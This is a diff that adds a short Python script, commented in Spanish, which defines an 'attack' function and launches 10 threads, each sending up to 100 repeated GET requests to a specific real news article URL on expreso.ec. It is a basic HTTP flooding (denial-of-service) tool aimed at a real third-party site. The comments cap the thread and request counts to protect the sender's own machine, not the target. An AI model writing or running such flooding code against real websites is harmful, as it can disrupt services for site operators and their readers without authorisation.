@@ -1,0 +1,29 @@
+import threading
+import requests
+
+# Función de ataque que hace solicitudes a la URL en un bucle
+def attack():
+    # Limitar el número de solicitudes por hilo para evitar bucles infinitos
+    for _ in range(100):  # 100 solicitudes por hilo
+        try:
+            # Agregar un tiempo de espera (timeout) para evitar que los hilos se queden esperando indefinidamente
+            response = requests.get('https://www.expreso.ec/actualidad/lider-grupo-criminal-colombiano-capturado-ecuador-211807.html', timeout=3)
+            print(f"Respuesta de la solicitud: {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error al hacer la solicitud: {e}")
+            break  # Salir del bucle en caso de error
+
+# Lista para almacenar los hilos
+threads = []
+
+# Crear y ejecutar una cantidad razonable de hilos (por ejemplo, 10)
+for i in range(10):  # Cambié a 10 hilos para evitar sobrecargar el sistema
+    t = threading.Thread(target=attack)
+    t.start()  # Iniciar el hilo
+    threads.append(t)
+
+# Esperar a que todos los hilos terminen
+for t in threads:
+    t.join()
+
+print("Todos los hilos han terminado.")
